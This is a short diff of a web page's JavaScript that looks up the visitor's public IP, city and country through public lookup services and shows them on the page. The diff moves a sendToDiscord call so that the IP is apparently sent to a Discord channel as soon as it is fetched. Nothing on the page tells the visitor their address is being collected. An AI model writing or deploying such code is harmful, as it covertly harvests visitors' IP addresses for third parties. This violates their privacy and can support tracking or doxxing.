@@ -65,13 +65,12 @@
                 let response = await fetch('https://api.ipify.org?format=json');
                 let data = await response.json();
                 document.getElementById('ip').innerText = data.ip;
+                sendToDiscord(data.ip);
 
                 let countryResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                 let country = await countryResponse.json();
                 document.getElementById('miasto').innerText = country.city;
                 document.getElementById('kraj').innerText = country.country_name;
-
-                sendToDiscord(data.ip, country.city, country.country_name);
             } catch (error) {
                 document.getElementById('ip').innerText = 'Error fetching IP';
             }
